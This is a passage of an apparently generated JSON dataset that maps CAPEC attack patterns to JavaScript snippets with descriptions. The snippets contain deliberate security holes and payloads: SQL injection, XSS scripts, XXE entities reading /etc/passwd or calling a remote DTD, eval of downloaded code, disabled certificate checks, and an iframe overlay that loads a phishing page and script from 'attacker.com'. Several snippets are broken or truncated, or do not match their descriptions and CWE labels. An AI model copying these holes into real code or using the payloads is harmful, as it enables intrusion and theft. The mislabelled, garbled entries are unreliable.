        "description": "This code snippet demonstrates a vulnerable session management system. It uses a weak secret for session encryption, does not invalidate existing session identifiers, and does not expire sessions. An attacker can forge a valid session credential by guessing the weak secret, reusing an existing session ID, or calculating the session ID based on the weak secret. The code also uses default credentials for authentication, which can be easily guessed by an attacker. Furthermore, the code does not protect the transport of credentials, sending them in plain text over an insecure connection."
    },
    {
        "capec_id": "197",
        "code_snippet": "const xml = `<!ENTITY a '<!ENTITY b '&#60;!ENTITY c '&#60;!ENTITY d '&#60;!ENTITY e '&#60;!ENTITY f '&#60;!ENTITY g '&#60;!ENTITY h '&#60;!ENTITY i '&#60;!ENTITY j '&#60;!ENTITY k '&#60;!ENTITY l '&#60;!ENTITY m '&#60;!ENTITY n '&#60;!ENTITY o '&#60;!ENTITY p '&#60;]]>'>`; const parser = new DOMParser(); const xmlDoc = parser.parseFromString(xml, 'application/xml'); console.log(xmlDoc);",
        "description": "This JavaScript code snippet demonstrates the concept of exponential data expansion, which can lead to excessive demands on CPU and memory. The code defines an XML document with nested entity references, which can cause an exponential growth in memory allocation when parsed. This is an example of CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'). The code also relates to CWE-770: Allocation of Resources Without Limits or Throttling, CWE-1102: Reliance on Machine-Dependent Data Representation, CWE-1093: Excessively Complex Data Representation, and CWE-1043: Data Element Aggregating an Excessively Large Number of Non-Primitive Elements."
    },
    {
        "capec_id": "198",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const errorPage = `Error occurred: ${userInput}`; document.write(errorPage);",
        "description": "This code snippet demonstrates a vulnerable error page that reflects user input without proper sanitization, allowing an attacker to inject malicious script code. The userInput variable contains a malicious script that will be executed when the errorPage is rendered, illustrating CWE-79, CWE-80, CWE-81, CWE-82, and CWE-692."
    },
    {
        "capec_id": "199",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS\")</ScRiPt>'; const filter = /<script>/i; if (!userInput.match(filter)) { document.write(userInput); }",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that fails to properly neutralize alternate XSS syntax, allowing an attacker to bypass filters and execute prohibited functionality. The code uses a case-insensitive filter to check for the '<script>' tag, but an attacker can bypass this filter by using an alternate case structure, such as '<ScRiPt>'. This code is vulnerable to CWE-87, CWE-80, CWE-1289, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst userInput = '{\"name\":\"<script>alert(1)</script>\",\"age\":25}';\n\n// CWE-20: Improper Input Validation\n// CWE-184: Incomplete List of Disallowed Inputs\n// CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n// CWE-182: Collapse of Data into Unsafe Value\n// CWE-707: Improper Neutralization\n\napp.post('/user', (req, res) => {\n  const userData = JSON.parse(userInput);\n  const query = `INSERT INTO users (name, age) VALUES ('${userData.name}', ${userData.age});`;\n  // Directly executing the query without proper sanitization\n  db.query(query, (err, result) => {\n    if (err) {\n      res.status(500).send({ message: 'Error creating user' });\n    } else {\n      res.send({ message: 'User created successfully' });\n    }\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of removing or disabling filtering mechanisms on the target application. The code accepts user input without proper validation or sanitization, allowing an attacker to inject malicious data, such as script tags, into the application. The input is then used to construct a SQL query, which can lead to SQL injection vulnerabilities. The code embodies CWE-20, CWE-184, CWE-74, CWE-182, and CWE-707."
    },
    {
        "capec_id": "201",
        "code_snippet": "const XmlJs = require('xml-js');\nconst fs = require('fs');\n\nclass User {\n  constructor(username, password) {\n    this.username = username;\n    this.password = password;\n  }\n}\n\nconst xml = `<user xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><username>admin</username><password xsi:type=\"xsd:string\">file:///etc/passwd</password></user>`;\nconst user = XmlJs.js2xml(xml, {compact: true, ignoreComment: true, spaces: 4});\nconst userObj = XmlJs.xml2js(user, {compact: true, ignoreComment: true, spaces: 4});\n\nconst password = userObj.user.password._text;\nfs.readFile(password, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data.toString());\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of creating a serialized data file with an external data reference, which can lead to arbitrary file access. The code uses the xml-js library to parse an XML string containing an external entity reference to a file. The parsed XML object is then used to read the contents of the referenced file, which can be an arbitrary file on the system. This code embodies CWE-611 (Improper Restriction of XML External Entity Reference), CWE-502 (Deserialization of Untrusted Data), and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)."
    },
    {
        "capec_id": "202",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://example.com/api/protected', true);\nxhr.setRequestHeader('Authorization', 'Bearer ' + localStorage.getItem('token'));\nxhr.send('malicious_data');",
        "description": "A malicious client-side JavaScript code that bypasses server-side authentication by modifying the client code to omit the authentication check, violating the intended security policy. The code uses a stored token to make a POST request to a protected API endpoint, allowing an attacker to access unauthorized resources."
    },
    {
        "capec_id": "203",
        "code_snippet": "const regedit = require('regedit');\n\n// CWE-15: External Control of System or Configuration Setting\nregedit.putValue({\n  'HKCU\\Software\\MyApp': {\n    'config': 'malicious_config'\n  }\n});\n\n// CWE-314: Cleartext Storage in the Registry\nregedit.putValue({\n  'HKCU\\Software\\MyApp': {\n    'password': 'mysecretpassword'\n  }\n});\n\n// CWE-1231: Improper Prevention of Lock Bit Modification\n// Assume 'lockBit' is a registry value that restricts access to a resource\nregedit.putValue({\n  'HKCU\\Software\\MyApp': {\n    'lockBit': 0\n  }\n});\n\n// CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n// Assume 'transientOperation' is a function that performs a transient operation\nfunction transientOperation() {\n  const sensitiveData = regedit.getValue({\n    'HKCU\\Software\\MyApp': {\n      'sensitiveData': ''\n    }\n  });\n  // Perform transient operation with sensitiveData\n}\n\n// CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\nconst encryptedConfig = 'encrypted_malicious_config';\nregedit.putValue({\n  'HKCU\\Software\\MyApp': {\n    'config': encryptedConfig\n  }\n});",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting weaknesses in authorization to modify content within a registry, using related CWEs for context."
    },
    {
        "capec_id": "204",
        "code_snippet": "const cache = window.localStorage;\n\nfunction authenticateUser(username, password) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://example.com/authenticate', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send(`username=${username}&password=${password}`);\n  const response = xhr.responseText;\n  cache.setItem('authToken', response);\n}\n\nfunction getSensitiveData() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://example.com/sensitiveData', true);\n  xhr.setRequestHeader('Authorization', `Bearer ${cache.getItem('authToken')}`);\n  xhr.send();\n  const response = xhr.responseText;\n  cache.setItem('sensitiveData', response);\n}\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of an adversary examining a target application's cache for sensitive information. The code uses the browser's local storage as a cache, which is not encrypted (CWE-311), and stores sensitive information such as authentication tokens and sensitive data (CWE-524, CWE-525). An attacker can browse the cache and retrieve this information, resulting in the disclosure of sensitive information."
    },
    {
        "capec_id": "205",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  \n  // CWE-522: Insufficiently Protected Credentials\n  // Storing credentials in plaintext\n  const credentials = {\n    username: username,\n    password: password\n  };\n  \n  // CWE-603: Use of Client-Side Authentication\n  // Performing authentication on the client-side\n  if (username === 'admin' && password === 'password') {\n    res.send('Authenticated!');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable authentication system that stores credentials in plaintext (CWE-522) and performs authentication on the client-side (CWE-603). An attacker can intercept the credentials and replay them to bypass authentication. This code also relates to CWE-294 (Authentication Bypass by Capture-replay) and CWE-592 (Authentication Bypass Issues), which are deprecated but still relevant in this context."
    },
    {
        "capec_id": "206",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Hard-coded credentials\nconst signingKey = '-----BEGIN RSA PRIVATE KEY-----\\nMIIEogIBAAKCAQEArxX...\\n-----END RSA PRIVATE KEY-----';\n\n// CWE-732: Incorrect permission assignment\nfs.chmodSync('/path/to/signing/key', '0777');\n\n// CWE-494: Download of code without integrity check\nconst downloadCode = (url) => {\n  const https = require('https');\n  https.get(url, (res) => {\n    let code = '';\n    res.on('data', (chunk) => {\n      code += chunk;\n    });\n    res.on('end', () => {\n      // CWE-506: Embedded malicious code\n      eval(code);\n    });\n  });\n};\n\n// CWE-603: Use of client-side authentication\nconst authenticate = (username, password) => {\n  if (username === 'admin' && password === 'password') {\n    return true;\n  }\n  return false;\n};\n\n// Sign malicious code with extracted credentials\nconst signCode = (code) => {\n  const signer = crypto.createSign('SHA256');\n  signer.update(code);\n  signer.end();\n  const signature = signer.sign(signingKey);\n  return signature;\n};\n\n// Download and execute malicious code\ndownloadCode('https://example.com/malicious-code.js');",
        "description": "JavaScript code snippet demonstrating the CAPEC, where an adversary extracts credentials used for code signing from a production environment and uses them to sign malicious content. The code includes CWEs such as hard-coded credentials, incorrect permission assignment, download of code without integrity check, embedded malicious code, and use of client-side authentication."
    },
    {
        "capec_id": "207",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/authenticatedResource', true); xhr.withCredentials = true; xhr.onload = function() { if (xhr.status === 200) { const response = JSON.parse(xhr.responseText); if (response.isAuthenticated) { // assume client-side authentication is successful, grant access to protected resource } } }; xhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of removing or disabling client-side functionality that the server assumes to be present and trustworthy. Specifically, it relates to CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-603 (Use of Client-Side Authentication), and CWE-807 (Reliance on Untrusted Inputs in a Security Decision). The code assumes that the client-side authentication check is sufficient to grant access to a protected resource, without verifying the authentication on the server-side. An adversary can bypass this check by modifying the client-side code to always return a successful authentication result, allowing unauthorized access to the protected resource."
    },
    {
        "capec_id": "208",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  // CWE-682: Incorrect Calculation\n  // CWE-1284: Improper Validation of Specified Quantity in Input\n  // CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n  // CWE-115: Misinterpretation of Input\n  var totalCost = price * quantity;\n  // Attacker can modify the logic here to return an incorrect total cost\n  // For example, an attacker can set totalCost to a fixed value\n  totalCost = 0.01;\n  return totalCost;\n}\n\n// Example usage:\nvar price = 10.99;\nvar quantity = 2;\nvar totalCost = calculateTotalCost(price, quantity);\nconsole.log('Total cost: $' + totalCost);\n\n// Send the total cost to the server\n// An attacker can intercept and modify the total cost before sending it to the server\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/checkout', true);\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({ totalCost: totalCost }));",
        "description": "This code snippet demonstrates a vulnerable JavaScript function that calculates the total cost of an item based on its price and quantity. The function can be modified by an attacker to return an incorrect total cost, which can then be sent to the server. The code embodies the CAPEC of modifying client-side logic for monetary calculations, and relates to CWEs 602, 682, 1284, 784, and 115."
    },
    {
        "capec_id": "209",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const scriptFile = '<script>alert(\"XSS\");</script>';\n  res.setHeader('Content-Type', 'image/jpeg');\n  res.send(scriptFile);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that serves a script file with a MIME type of 'image/jpeg', which can trick some browsers into executing the script. The server uses the Express.js framework and listens on port 3000. When a GET request is made to the root URL, the server responds with a script file that contains an XSS payload, but sets the Content-Type header to 'image/jpeg', which can cause some browsers to execute the script."
    },
    {
        "capec_id": "211",
        "code_snippet": "function generateImageTag(userInput) {\n  var imgTag = '<img src=\\'' + userInput + '\\' alt=\\'user image\\'>'; \n  document.body.innerHTML += imgTag;\n}\n\n// Example usage:\nvar userInput = '<script>alert(\\",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of generating an image tag based on user input, which can lead to Cross-Site Scripting (XSS) attacks. The code does not properly neutralize the user input, allowing an attacker to inject malicious scripts. This is related to CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') and CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page."
    },
    {
        "capec_id": "212",
        "code_snippet": "const fs = require('fs');\nconst cpuInfo = require('cpu-info');\n\n// CWE-1242: Inclusion of Undocumented Features or Chicken Bits\nconst undocumentedFeature = fs.readFileSync('/sys/kernel/debug/undocumented_feature', 'utf8');\n\n// CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories\nconst wearLeveling = require('wear-leveling');\nwearLeveling.disable();\n\n// CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\nconst cpuInstructions = cpuInfo.getInstructions();\nconst maliciousInstruction = cpuInstructions.find(instruction => instruction === 'LOCK_UP');\n\n// CWE-695: Use of Low-Level Functionality\nconst lowLevelFunctionality = require('low-level-func');\nlowLevelFunctionality.accessSensitiveInfo();\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = require('system-info');\nconst sensitiveInfo = systemInfo.getSensitiveData();\nconsole.log(sensitiveInfo);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of leveraging a legitimate capability of an application to achieve a negative technical impact. It includes undocumented features, disables wear leveling, uses a sequence of processor instructions to cause unexpected behavior, uses low-level functionality, and exposes sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "213",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../secretFile';\n\ntry {\n  fs.readFile(userInput, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(data);\n    }\n  });\n} catch (e) {\n  console.error(e);\n}",
        "description": "This code snippet demonstrates a path traversal vulnerability. The 'userInput' variable is not properly sanitized, allowing an attacker to access files outside of the intended directory by injecting '../' or other traversal sequences."
    },
    {
        "capec_id": "214",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  try {\n    const userInput = req.query.input;\n    const socket = new require('net').Socket();\n    socket.connect(8080, 'localhost', () => {\n      socket.write(userInput);\n    });\n    res.send('Success');\n  } catch (e) {\n    console.log(e); // CWE-534: Information Exposure Through Debug Log Files\n    res.status(500).send(e.message);\n  }\n});\n\napp.use((err, req, res, next) => {\n  res.status(500).send(err.message); // CWE-7: J2EE Misconfiguration: Missing Custom Error Page\n});\n\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates a vulnerable J2EE application that uses direct socket connections (CWE-246) and lacks input validation (CWE-106). It also exposes sensitive information through debug log files (CWE-534) and uses a default error page that displays error messages (CWE-7). The code is vulnerable to fuzzing attacks, which can be used to map the application's internal structure."
    },
    {
        "capec_id": "215",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/fuzz', (req, res) => {\n  try {\n    const userInput = req.query.input;\n    const sensitiveData = process.env.SECRET_KEY;\n    const unsafeEval = eval(userInput);\n    if (unsafeEval === sensitiveData) {\n      console.log(`Error: Unauthorized access to sensitive data: ${sensitiveData}`);\n      res.status(500).send(`Error: Unauthorized access to sensitive data: ${sensitiveData}`);\n    } else {\n      res.send('Invalid input');\n    }\n  } catch (e) {\n    console.error(`Error: ${e.message}`);\n    res.status(500).send(`Error: ${e.message}`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express server that is susceptible to fuzzing attacks. The server takes user input and attempts to evaluate it using the eval() function, which can lead to the exposure of sensitive system information. If the user input matches a secret key, the server logs and returns an error message containing the sensitive data. The code also logs and returns error messages with sensitive information when an exception occurs. This code embodies the CAPEC and CWEs by generating error messages containing sensitive information, inserting sensitive information into log files, and exposing sensitive system information to unauthorized actors."
    },
    {
        "capec_id": "216",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/api/data', (req, res) => {\n  const data = req.body;\n  const userId = req.query.userId;\n  // No authentication or verification of the userId\n  if (userId === 'admin') {\n    // Critical function with no authentication\n    res.send('Admin data: ' + data);\n  } else {\n    // No message integrity check\n    res.send('User data: ' + data);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows an adversary to manipulate the communication channel. The server does not perform authentication for the critical function of accessing admin data, and it does not verify the source of the incoming request. Additionally, it does not ensure the integrity of the message during transmission, making it vulnerable to tampering. An attacker can exploit this by sending a malicious request with a spoofed userId, allowing them to access sensitive data or inject malicious data into the communication stream."
    },
    {
        "capec_id": "217",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false // disabling certificate verification\n};\n\nconst req = https.request(options, (res) => {\n  console.log('statusCode:', res.statusCode);\n  console.log('headers:', res.headers);\n\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(e);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a vulnerable SSL/TLS communication. The 'rejectUnauthorized' option is set to false, which disables certificate verification, allowing an adversary to intercept and access sensitive information. This code is vulnerable to CWE-201, CWE-294, CWE-923, CWE-602, and CWE-940."
    },
    {
        "capec_id": "218",
        "code_snippet": "const soap = require('soap');\nconst xmlParser = require('xml2js').parseString;\n\nconst uddiMessage = '<uddi:get_serviceDetail xmlns:uddi=\"http://www.uddi.org/schema\"><businessKey>valid_business_key</businessKey></uddi:get_serviceDetail>';\n\nconst client = new soap.Client('http://example.com/wsdl', {endpoint: 'http://example.com/soap'});\n\nclient.setSecurity(new soap.WSSecurity('username', 'password'));\n\nclient.get_serviceDetail(uddiMessage, function(err, result) {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result);\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript SOAP client that does not properly verify the authenticity of the UDDI message, allowing an attacker to spoof the message and impersonate a legitimate service provider. The code uses the 'soap' package to create a SOAP client and the 'xml2js' package to parse the UDDI message. However, it does not validate the XML against a proper schema (CWE-112) and does not sufficiently verify the origin or authenticity of the data (CWE-345). Additionally, the code does not correctly specify the intended destination for the SOAP request (CWE-941) and does not ensure the integrity of the communication channel (CWE-300, CWE-924). An attacker could exploit these vulnerabilities to manipulate the protocols used between the client and the service provider, resulting in disclosure of sensitive information, loss of message integrity, or even financial fraud."
    },
    {
        "capec_id": "219",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml2js');\n\napp.post('/processXml', (req, res) => {\n  const xml = req.body.xml;\n  const parser = new xmlparser.Parser();\n  parser.parseString(xml, (err, result) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send('Error parsing XML');\n    } else {\n      const externalEntityUrl = result.externalEntityUrl;\n      const xhr = new XMLHttpRequest();\n      xhr.open('GET', externalEntityUrl, true);\n      xhr.onload = function() {\n        if (xhr.status === 200) {\n          const responseXml = xhr.responseText;\n          const xpathExpr = '//node[@id=\"' + result.nodeId + '\"]';\n          const xmlDoc = new DOMParser().parseFromString(responseXml, 'application/xml');\n          const nodeList = xmlDoc.evaluate(xpathExpr, xmlDoc, null, XPathResult.ANY_TYPE, null);\n          const nodeValue = nodeList.iterateNext().textContent;\n          res.send(nodeValue);\n        } else {\n          res.status(500).send('Error fetching external entity');\n        }\n      };\n      xhr.send();\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable XML processing system that is susceptible to XML Routing Detour Attacks (CAPEC-94). The system accepts XML input from an untrusted source without proper validation (CWE-112), allowing an attacker to inject malicious XML entities with external URLs (CWE-611). The system then uses the injected XML entity to construct an XPath expression (CWE-643) to retrieve data from an external XML database. The system also acts as an unintended proxy or intermediary (CWE-441) by forwarding the request to an external actor, and it does not properly restrict the reference to the external resource (CWE-610). An attacker can exploit these vulnerabilities to route the XML processing to an external entity, modify the responses, and hide the forwarding and processing from the legitimate processing systems."
    },
    {
        "capec_id": "220",
        "code_snippet": "const net = require('net');\n\nconst socket = new net.Socket();\n\nsocket.connect(8080, 'localhost', () => {\n  console.log('Connected');\n  socket.write('GET / HTTP/1.1\\r\\nHost: localhost:8080\\r\\n\\r\\n');\n});\n\nsocket.on('data', (data) => {\n  console.log(`Received: ${data}`);\n  // Replay the received data to bypass authentication\n  socket.write(data);\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that embodies the main idea of the CAPEC. It uses a socket to connect to a server and sends a GET request. The received data is then replayed to bypass authentication, which is an example of CWE-294: Authentication Bypass by Capture-replay. Additionally, the code directly uses sockets instead of using framework method calls, which is a bad practice (CWE-246: J2EE Bad Practices: Direct Use of Sockets). The code also does not correctly specify the intended destination for the request, which is an example of CWE-941: Incorrectly Specified Destination in a Communication Channel. Furthermore, the code does not select the strongest algorithm available for encryption or authentication, which is an example of CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade'). Finally, the code relies on the client to implement a mechanism that is intended to protect the server, which is an example of CWE-602: Client-Side Enforcement of Server-Side Security."
    },
    {
        "capec_id": "221",
        "code_snippet": "const yaml = require('js-yaml');\nconst fs = require('fs');\n\nconst maliciousYaml = `--- !ruby/object:Net::HTTP\nuri: !ruby/object:URI\n  uri: http://example.com/very/large/resource\n  request_uri: /very/large/resource\n  hostname: example.com\n  port: 80\n  scheme: http\n  userinfo:\"\n\nfs.writeFileSync('malicious.yaml', maliciousYaml);\n\nconst yamlContent = fs.readFileSync('malicious.yaml', 'utf8');\nconst parsedYaml = yaml.safeLoad(yamlContent);\nconsole.log(parsedYaml);",
        "description": "This JavaScript code snippet demonstrates a denial of service vulnerability through XML external entity injection. It creates a malicious YAML file with an external entity reference to a large resource, which can cause the system to freeze or crash when parsed. The CWEs related to this CAPEC are CWE-611 (Improper Restriction of XML External Entity Reference), CWE-99 (Improper Control of Resource Identifiers), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-594 (J2EE Framework: Saving Unserializable Objects to Disk), and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "222",
        "code_snippet": "<script>function loadIframe(){var iframe = document.createElement('iframe');iframe.src = 'https://attacker.com/phishing-page';iframe.frameBorder = '0';iframe.width = '100%';iframe.height = '100%';document.body.appendChild(iframe);}loadIframe();</script><img src='https://attacker.com/malicious-script.js' onerror='loadIframe()'>",
        "description": "This code snippet demonstrates an iFrame overlay attack. The img tag loads a malicious script from the attacker's domain, which creates an iframe overlay that tricks the user into interacting with the phishing page. The CWEs involved are CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-451 (User Interface Misrepresentation of Critical Information), CWE-368 (Context Switching Race Condition), and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page)."
    },
    {
        "capec_id": "224",
        "code_snippet": "const os = require('os');\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(`OS: ${os.type()} ${os.release()}\\n` +\n         `CPU Arch: ${os.arch()}\\n` +\n         `Node.js Version: ${process.version}\\n` +\n         `HTTP Server Header: ${req.headers['user-agent']}\\n`);\n}).listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This code snippet is an example of a vulnerable HTTP server that exposes sensitive system information, including the operating system type and release, CPU architecture, Node.js version, and HTTP server header. This information can be used by an adversary to fingerprint the system and potentially identify vulnerabilities."
    },
    {
        "capec_id": "226",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    res.cookie('session_id', generateSessionId(), { httpOnly: true });\n    res.redirect('/protected');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  if (sessionId) {\n    // No validation or integrity checking of the session ID\n    res.send('Welcome, authenticated user!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction generateSessionId() {\n  // Weak session ID generation, vulnerable to session fixation\n  return Math.floor(Math.random() * 1000000);\n}\n\nfunction checkCredentials(username, password) {\n  // Insecure client-side authentication, vulnerable to bypass\n  return username === 'admin' && password === 'password';\n}",
        "description": "This code snippet demonstrates a vulnerable web application that relies on cookies without validation and integrity checking, allowing an attacker to manipulate the session ID. The application also uses weak session ID generation, making it vulnerable to session fixation. Furthermore, the authentication check is performed on the client-side, making it vulnerable to bypass. An attacker can sniff the session ID from an existing connection and reuse it to gain access to the protected resource."
    },
    {
        "capec_id": "227",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/resource', (req, res) => {\n  let count = 0;\n  while (count < 1000000) {\n    // Perform some CPU-intensive task or database query\n    for (let i = 0; i < 10000; i++) {\n      Math.sqrt(i);\n    }\n    count++;\n  }\n  res.send('Resource is busy');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js server that allows an adversary to continually engage a specific resource, keeping it tied up and unavailable to legitimate users. The /resource endpoint performs a CPU-intensive task in an uncontrolled loop, exhausting system resources and denying access to legitimate users. This code embodies CWE-400: Uncontrolled Resource Consumption, CWE-770: Allocation of Resources Without Limits or Throttling, and CWE-285: Improper Authorization."
    },
    {
        "capec_id": "228",
        "code_snippet": "const parser = new DOMParser();\nconst xml = '<!DOCTYPE doc [<!ENTITY xxe SYSTEM \"http://example.com/malicious.dtd\">]><doc>&xxe;</doc>'; \nconst doc = parser.parseFromString(xml, 'application/xml');\nconsole.log(doc.documentElement.textContent);",
        "description": "This JavaScript code snippet demonstrates an XML External Entity (XXE) injection vulnerability. It creates an XML document with a malicious DTD that references an external entity, which can lead to resource depletion or unauthorized access to sensitive data. The code uses the DOMParser to parse the malicious XML, which can cause the parser to make unnecessary HTTP requests or consume excessive resources."
    },
    {
        "capec_id": "229",
        "code_snippet": "const xmljs = require('xml-js');\nconst yaml = require('js-yaml');\n\nconst maliciousXml = '<!ENTITY xxe \"../../../../../../../../etc/passwd\"> <root>&xxe;</root>';\nconst maliciousYaml = '---\nroot: &xxe ../../../../../../../../etc/passwd\n';\n\ntry {\n  xmljs.js2xml(maliciousXml, {compact: true, ignoreComment: true, spaces: 4});\n  yaml.safeLoad(maliciousYaml);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This code snippet demonstrates a denial of service condition in XML and YAML parsers. The malicious XML and YAML inputs contain external entity references that can cause the parsers to exhaust CPU resources. The xml-js and js-yaml libraries are used to parse the malicious inputs, which can lead to a denial of service condition due to the inefficient parsing algorithm. This code embodies CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-1102 (Reliance on Machine-Dependent Data Representation), CWE-611 (Improper Restriction of XML External Entity Reference), CWE-1342 (Information Exposure through Microarchitectural State after Transient Execution), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "230",
        "code_snippet": "const yaml = require('js-yaml');\nconst xmljs = require('xml-js');\n\nconst userInput = '<!ENTITY a \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\"> <foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>';\nconst xmlOptions = { ignoreComment: true, alwaysArray: true };\n\ntry {\n  const xmlDoc = xmljs.xml2js(userInput, xmlOptions);\n  const yamlDoc = yaml.safeDump(xmlDoc);\n  console.log(yamlDoc);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting XML and YAML parsers by injecting malicious data that causes excessive resource consumption. The code uses the 'js-yaml' and 'xml-js' libraries to parse user-input XML data and convert it to YAML. The userInput variable contains a malicious XML entity that causes the parser to recursively expand, leading to excessive memory consumption and CPU utilization. This code embodies CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), CWE-770 (Allocation of Resources Without Limits or Throttling), and CWE-1102 (Reliance on Machine-Dependent Data Representation)."
    },
    {
        "capec_id": "231",
        "code_snippet": "const xml2js = require('xml2js');\nconst parser = new xml2js.Parser();\n\nconst oversizedXml = '<!ELEMENT foo (bar)*><foo>'; for (let i = 0; i < 100000; i++) { oversizedXml += '<bar>'; for (let j = 0; j < 100; j++) { oversizedXml += '<baz>'; } oversizedXml += '</bar>'; }\n\nparser.parseString(oversizedXml, (err, result) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of injecting oversized serialized data payloads into a parser. The code uses the xml2js library to parse an oversized XML string that contains an excessive number of nested elements, which can lead to system resource exhaustion and potential arbitrary code execution. The CWEs embodied in this code snippet include CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), CWE-770 (Allocation of Resources Without Limits or Throttling), and CWE-1102 (Reliance on Machine-Dependent Data Representation)."
    },
    {
        "capec_id": "233",
